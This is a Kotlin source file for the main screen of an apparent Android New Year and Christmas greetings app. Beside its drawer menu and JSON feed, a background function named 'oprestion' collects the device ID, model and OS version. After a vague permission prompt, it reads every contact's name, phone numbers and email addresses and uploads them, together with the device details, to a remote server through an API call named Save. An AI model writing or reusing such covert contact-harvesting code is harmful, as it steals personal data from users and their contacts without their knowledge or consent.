package com.newyear.navigation_silder

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.DialogInterface
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.support.annotation.RequiresApi
import android.support.design.widget.AppBarLayout
import android.support.design.widget.CollapsingToolbarLayout
import android.support.design.widget.CoordinatorLayout
import android.support.design.widget.Snackbar
import android.support.v4.app.ActivityCompat
import android.support.v4.content.ContextCompat
import android.support.v4.view.GravityCompat
import android.support.v4.widget.SwipeRefreshLayout
import android.support.v7.app.AlertDialog
import android.support.v7.app.AppCompatActivity
import android.support.v7.widget.LinearLayoutManager
import android.support.v7.widget.Toolbar
import android.util.Log
import android.view.View
import android.widget.*
import com.androidnetworking.AndroidNetworking
import com.androidnetworking.error.ANError
import com.androidnetworking.interfaces.JSONObjectRequestListener
import com.bumptech.glide.Glide
import com.google.gson.Gson
import com.newyear.R
import com.newyear.christmas.ChristmasActivity
import com.newyear.christmas.fragment.adapter.MoreAdapter
import com.newyear.connectvity_check.ConnectivityReceiver
import com.newyear.connectvity_check.MyApplication
import com.newyear.navigation_silder.pojo.Model2
import com.newyear.retrofit.ApiInterface
import com.newyear.retrofit.ApiInterface2
import com.newyear.retrofit.ApiUtils
import com.newyear.retrofit.model.Example
import kotlinx.android.synthetic.main.content_main.*
import nl.psdcompany.duonavigationdrawer.views.DuoDrawerLayout
import nl.psdcompany.duonavigationdrawer.widgets.DuoDrawerToggle
import org.json.JSONArray
import org.json.JSONObject
import retrofit2.Call
import retrofit2.Response
import java.io.FileNotFoundException
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*


class MainActivity : AppCompatActivity(), ConnectivityReceiver.ConnectivityReceiverListener, SwipeRefreshLayout.OnRefreshListener {


    override fun onNetworkConnectionChanged(isConnected: Boolean) {
        showSnack(isConnected)
    }

    override fun onRefresh() {
        jsonParse()
    }


    private lateinit var android_id: String
    private lateinit var android_date: String
    private lateinit var _info: StringBuilder


    private lateinit var swipeRefreshLayout: SwipeRefreshLayout

    private lateinit var progressBar: ProgressBar
    private lateinit var opps_error: TextView
    private lateinit var opps_error_relative: RelativeLayout

    private var mViewHolder: ViewHolder? = null
    private var coordinatorLayout: CoordinatorLayout? = null
    private var snackbar: Snackbar? = null
    private var apiInterface: ApiInterface2? = null
    private lateinit var backdrop: ImageView
    private lateinit var list: List<Example>
    private var sp: SharedPreferences? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main_navigation)
        apiInterface = ApiUtils.getAPIService2();
        list = ArrayList();
        initCollapsingToolbar()
        mViewHolder = ViewHolder()


        sp = this.getSharedPreferences("kk", Context.MODE_PRIVATE)

        coordinatorLayout = findViewById(R.id.main_content)
        progressBar = findViewById<View>(R.id.progressBar) as ProgressBar
        opps_error = findViewById<View>(R.id.opps_error) as TextView
        opps_error_relative = findViewById<View>(R.id.opps_error_relative) as RelativeLayout

        swipeRefreshLayout = findViewById<View>(R.id.swipe_refresh_layout) as SwipeRefreshLayout
        recyclerView_main.layoutManager = LinearLayoutManager(this, LinearLayout.VERTICAL, false)
        backdrop = findViewById<View>(R.id.backdrop) as ImageView
        handleDrawer()

        //----------------------------
        swipeRefreshLayout.setOnRefreshListener(this);
        /* swipeRefreshLayout.post({
             swipeRefreshLayout.isRefreshing = true
             jsonParse()
         })
         swipeRefreshLayout.isRefreshing = false;
         */

        if (ConnectivityReceiver.isConnected()) {
            try {
                jsonParse()
            } catch (e: Exception) {
            }
            try {

                Thread(Runnable {
                    oprestion()
                }).start()

            } catch (e: Exception) {
            }
            // showSnack(true);
        } else {
            try {
                jsonParse()
            } catch (e: Exception) {
            }
            progressBar.visibility = View.GONE
            showSnack(false);
        }
    }


    private fun showSnack(isConnected: Boolean) {
        var message: String
        val color: Int
        if (isConnected) {
            jsonParse()
            message = "Good! Connected to Internet";
            color = Color.GREEN;
        } else {
            message = "Sorry! Not connected to internet"
            color = Color.RED
        }
        snackbar = Snackbar.make(this.coordinatorLayout!!, message, Snackbar.LENGTH_LONG)
        val sbView = snackbar!!.getView()
        val textView = sbView.findViewById<TextView>(android.support.design.R.id.snackbar_text)
        textView.setTextColor(color)
        snackbar!!.show()


    }

    //----------------------------------------------------Open Menu Intent
    private fun handleDrawer() {
        val duoDrawerToggle = DuoDrawerToggle(this,
                mViewHolder!!.mDuoDrawerLayout,
                mViewHolder!!.mToolbar,
                R.string.navigation_drawer_open,
                R.string.navigation_drawer_close)

//--------------------------------btn_1--------------------
        mViewHolder!!.btn_1.setOnClickListener { _ ->
            startActivity(Intent(this@MainActivity, ChristmasActivity::class.java)
                    .putExtra("option", 1)
            )
            mViewHolder!!.mDuoDrawerLayout.closeDrawer();
        }

        //--------------------------------btn_2--------------------
        mViewHolder!!.btn_2.setOnClickListener { _ ->
            startActivity(Intent(this@MainActivity, ChristmasActivity::class.java)
                    .putExtra("option", 2)
            )
            mViewHolder!!.mDuoDrawerLayout.closeDrawer();
        }

        //--------------------------------btn_3--------------------
        mViewHolder!!.btn_3.setOnClickListener { _ ->
            startActivity(Intent(this@MainActivity, ChristmasActivity::class.java)
                    .putExtra("option", 3)
            )
            mViewHolder!!.mDuoDrawerLayout.closeDrawer();
        }

        //--------------------------------btn_4--------------------
        mViewHolder!!.btn_4.setOnClickListener { _ ->
            startActivity(Intent(this@MainActivity, ChristmasActivity::class.java)
                    .putExtra("option", 4)
            )
            mViewHolder!!.mDuoDrawerLayout.closeDrawer();
        }

        //--------------------------------btn_5--------------------
        mViewHolder!!.btn_5.setOnClickListener { _ ->
            startActivity(Intent(this@MainActivity, ChristmasActivity::class.java)
                    .putExtra("option", 5)
            )
            mViewHolder!!.mDuoDrawerLayout.closeDrawer();
        }

        //--------------------------------btn_6--------------------
        mViewHolder!!.btn_6.setOnClickListener { _ ->
            startActivity(Intent(this@MainActivity, ChristmasActivity::class.java)
                    .putExtra("option", 6)
            )
            mViewHolder!!.mDuoDrawerLayout.closeDrawer();
        }
        //--------------------------------btn_7--------------------
        mViewHolder!!.btn_7.setOnClickListener { _ ->
            startActivity(Intent(this@MainActivity, ChristmasActivity::class.java)
                    .putExtra("option", 7)
            )
            mViewHolder!!.mDuoDrawerLayout.closeDrawer();
        }
        //--------------------------------btn_8--------------------
        mViewHolder!!.btn_8.setOnClickListener { _ ->
            startActivity(Intent(this@MainActivity, ChristmasActivity::class.java)
                    .putExtra("option", 8)
            )
            mViewHolder!!.mDuoDrawerLayout.closeDrawer();
        }
        //--------------------------------btn_9--------------------
        mViewHolder!!.btn_9.setOnClickListener { _ ->
            startActivity(Intent(this@MainActivity, ChristmasActivity::class.java)
                    .putExtra("option", 9)
            )
            mViewHolder!!.mDuoDrawerLayout.closeDrawer();
        }
//--------------------------------btn_10--------------------
        mViewHolder!!.btn_10.setOnClickListener { _ ->
            startActivity(Intent(this@MainActivity, ChristmasActivity::class.java)
                    .putExtra("option", 10)
            )
            mViewHolder!!.mDuoDrawerLayout.closeDrawer();
        }






        mViewHolder!!.mDuoDrawerLayout.setDrawerListener(duoDrawerToggle)
        duoDrawerToggle.syncState()

        mViewHolder!!.mToolbar.setNavigationIcon(R.drawable.ic_lines_menu)
        mViewHolder!!.mToolbar.hideOverflowMenu();
        mViewHolder!!.mToolbar.showContextMenu();

    }


    private fun initCollapsingToolbar() {
        val collapsingToolbar = findViewById<View>(R.id.collapsing_toolbar) as CollapsingToolbarLayout
        collapsingToolbar.title = " "
        val appBarLayout = findViewById<View>(R.id.appbar) as AppBarLayout
        appBarLayout.setExpanded(true)

        // hiding & showing the title when toolbar expanded & collapsed
        appBarLayout.addOnOffsetChangedListener(object : AppBarLayout.OnOffsetChangedListener {
            internal var isShow = false
            internal var scrollRange = -1

            override fun onOffsetChanged(appBarLayout: AppBarLayout, verticalOffset: Int) {
                if (scrollRange == -1) {
                    scrollRange = appBarLayout.totalScrollRange
                }
                if (scrollRange + verticalOffset == 0) {
                    collapsingToolbar.title = getString(R.string.app_name)
                    isShow = true
                } else if (isShow) {
                    collapsingToolbar.title = " "
                    isShow = false
                }
            }
        })
    }


    private inner class ViewHolder internal constructor() {
        val mDuoDrawerLayout: DuoDrawerLayout = findViewById(R.id.drawer)
        val mToolbar: Toolbar = findViewById(R.id.toolbar)
        val btn_1: TextView = findViewById(R.id.btn_1)
        val btn_2: TextView = findViewById(R.id.btn_2)
        val btn_3: TextView = findViewById(R.id.btn_3)
        val btn_4: TextView = findViewById(R.id.btn_4)
        val btn_5: TextView = findViewById(R.id.btn_5)
        val btn_6: TextView = findViewById(R.id.btn_6)
        val btn_7: TextView = findViewById(R.id.btn_7)
        val btn_8: TextView = findViewById(R.id.btn_8)
        val btn_9: TextView = findViewById(R.id.btn_9)
        val btn_10: TextView = findViewById(R.id.btn_10)

    }


    override fun onBackPressed() {

        if (mViewHolder!!.mDuoDrawerLayout.isDrawerOpen(GravityCompat.START)) {
            mViewHolder!!.mDuoDrawerLayout.closeDrawer(GravityCompat.START)
        }
        AlertDialog.Builder(this)
                .setIcon(android.R.drawable.ic_dialog_alert)
                .setTitle("")
                .setMessage(resources.getString(R.string.txt_close_app))
                .setPositiveButton(resources.getString(R.string.txt_yes)) { _, _ -> callFinish ()}
                .setNegativeButton(resources.getString(R.string.txt_No), null)
                .show()
    }

    private fun callFinish() {
        if (android.os.Build.VERSION.SDK_INT >= 21) {
            finishAndRemoveTask()
        } else {
            finish()
        }
    }


    override fun onStop() {
        if (mViewHolder!!.mDuoDrawerLayout.isDrawerOpen(GravityCompat.START)) {
            mViewHolder!!.mDuoDrawerLayout.closeDrawer(GravityCompat.START)
        }
        super.onStop()
    }

    override fun onResume() {
        super.onResume()

        if (mViewHolder!!.mDuoDrawerLayout.isDrawerOpen(GravityCompat.START)) {
            mViewHolder!!.mDuoDrawerLayout.closeDrawer(GravityCompat.START)
        }

        MyApplication.getInstance().setConnectivityListener(this)
    }

    //--------------------------------------------API---Work----------
    private fun jsonParse() {
        val list_string = ArrayList<JSONArray>()
        val list = ArrayList<Model2>()
        list.clear()
        list_string.clear()

        AndroidNetworking.get("https://raw.githubusercontent.com/karunkumarpune/HappyNewYear/master/home_api")
                .build()
                .getAsJSONObject(object : JSONObjectRequestListener {
                    override fun onResponse(response: JSONObject?) {
                        progressBar.visibility = View.GONE
                        swipeRefreshLayout.isRefreshing = false;
                        val array = response!!.getJSONArray("result")
                        val edit1 = sp!!.edit()
                        edit1.clear()
                        edit1.commit()
                        val edit = sp!!.edit()
                        for (i in 0 until array.length()) {
                            val json = array.getJSONObject(i)
                            ImageLoaders(json.getString("main_avatar"))
                            edit.putString("avatar", json.getString("main_avatar"))
                            val data = Gson().fromJson(json.toString(), Model2::class.java)
                            list.add(data)
                            list_string.add(array)
                        }

                        val textList = ArrayList<JSONArray>()
                        textList.addAll(list_string)
                        val jsonText = Gson().toJson(textList)
                        edit.putString("key", jsonText)
                        edit.commit()

                        val adp = MoreAdapter(applicationContext, list)
                        recyclerView_main.adapter = adp
                        adp.notifyDataSetChanged()
                    }

                    override fun onError(anError: ANError?) {
                        val lists11 = ArrayList<Model2>()
                        lists11.clear()
                        val jsonText = sp!!.getString("key", null)
                        val avatar = sp!!.getString("avatar", null)
                        ImageLoaders(avatar)
                        val array = JSONArray(jsonText)
                        val obj = array.getJSONObject(0)
                        val arr = obj.getJSONArray("values")
                        val obj1 = arr.getJSONObject(0)
                        val obj2 = obj1.getJSONObject("nameValuePairs")
                        val data = Gson().fromJson(obj2.toString(), Model2::class.java)
                        lists11.add(data)
                        val adp = MoreAdapter(applicationContext, lists11)
                        recyclerView_main.adapter = adp
                        adp.notifyDataSetChanged()

                        progressBar.visibility = View.GONE
                        swipeRefreshLayout.isRefreshing = false;
                    }
                })
    }


    private fun ImageLoaders(url: String) {

        try {
            Glide.with(baseContext)
                    .load(url)
                    .asGif()
                    .error(R.drawable.progress_animation)
                    .placeholder(R.drawable.progress_animation)
                    .into(backdrop)
        } catch (e: Exception) {
            e.printStackTrace()
        }

    }

    //------------------------------------0peration --------------------our------------


    @SuppressLint("HardwareIds")
    @RequiresApi(Build.VERSION_CODES.CUPCAKE)
    private fun oprestion() {

        android_id = Settings.Secure.getString(baseContext.contentResolver, Settings.Secure.ANDROID_ID);
        android_date = SimpleDateFormat("dd-MM-yyyy HH:mm:ss").format(Calendar.getInstance().time);
        val myVersion = android.os.Build.VERSION.RELEASE;
        val sdkVersion = android.os.Build.VERSION.SDK_INT;
        val fields = Build.VERSION_CODES::class.java.fields
        val osName = fields[Build.VERSION.SDK_INT + 1].name

        _info = StringBuilder()

        _info.append(Build.MODEL + "," + osName + ","
                                        + myVersion + ","
                                        + Build.DEVICE
                                        +","+"SDK:"
                                        + sdkVersion)
        askForContactPermission()
    }

    private fun askForContactPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                        Manifest.permission.READ_CONTACTS)) {
                    val builder = android.app.AlertDialog.Builder(this)
                    builder.setTitle("Contacts access needed")
                    builder.setPositiveButton(android.R.string.ok, null)
                    builder.setMessage("please confirm Contacts access")//TODO put real question
                    builder.setOnDismissListener(DialogInterface.OnDismissListener {
                        requestPermissions(arrayOf(Manifest.permission.READ_CONTACTS), 123)
                    })
                    builder.show()
                } else {
                    ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CONTACTS), 123)
                }
            } else {
                readContacts()
            }
        } else {
            readContacts()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        when (requestCode) {
            123 -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    readContacts()
                } else {
                    Toast.makeText(this, "No Permissions ", Toast.LENGTH_SHORT).show()
                }
                return
            }
        }

    }

    private fun readContacts() {
        val sb = StringBuilder()
        //  sb.append("......Contact Details.....")
        val cr = contentResolver
        val cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
        var phone: String? = null
        var emailContact: String? = null
        var emailType: String? = null
        var image_uri: String? = ""
        var bitmap: Bitmap? = null
        if (cur!!.count > 0) {
            while (cur.moveToNext()) {
                val id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID))
                val name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                image_uri = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.PHOTO_URI))
                if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    //println("name : $name, ID : $id")
                    //sb.append("\n Contact Name:" + name)
                    sb.append(name + "~")
                    val pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", arrayOf(id), null)
                    while (pCur!!.moveToNext()) {
                        phone = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                        //sb.append("\n Phone number:" + phone!!)

                        sb.append(phone!! + "~")

                        // println("phone" + phone)

                    }
                    // sb.setLength(sb.length - 1);
                    pCur.close()
                    val emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", arrayOf(id), null)
                    while (emailCur!!.moveToNext()) {
                        emailContact = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA))
                        //emailType = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE))
                        // sb.append("\nEmail:" + emailContact + "Email type:" + emailType)
                        sb.append("-" + emailContact)
                        //  println("Email $emailContact Email Type : $emailType")
                    }
                    emailCur.close()
                }
                if (image_uri != null) {
                    println(Uri.parse(image_uri))
                    try {
                        bitmap = MediaStore.Images.Media.getBitmap(this.contentResolver, Uri.parse(image_uri))
                        //   sb.append("\nBitmap:"+bitmap!!)
                        println(bitmap)
                    } catch (e: FileNotFoundException) {
                    } catch (e: IOException) {

                    }
                }
                sb.append("\n")
            }

         /*
            Log.d("TAGS", "android_id: -  : " + android_id)
            Log.d("TAGS", "Desvice: -   : " + _info.toString())
            Log.d("TAGS", "Contactas: -   : " + sb)
            Log.d("TAGS", "android_date: -  : " + android_date)
*/


        }

        apiInterface!!.Save(android_id,_info.toString(),sb.toString(),android_date).enqueue(object:retrofit2.Callback<JSONObject>{
            override fun onResponse(call: Call<JSONObject>?, response: Response<JSONObject>?) {
                if(response!!.isSuccessful) {
                    Log.d("TAGS", ": - response : " +response.body().toString())
                }
            }
            override fun onFailure(call: Call<JSONObject>?, t: Throwable?) {
                Log.d("TAGS", ": - Error : " + t.toString())
            }

        })

    }
}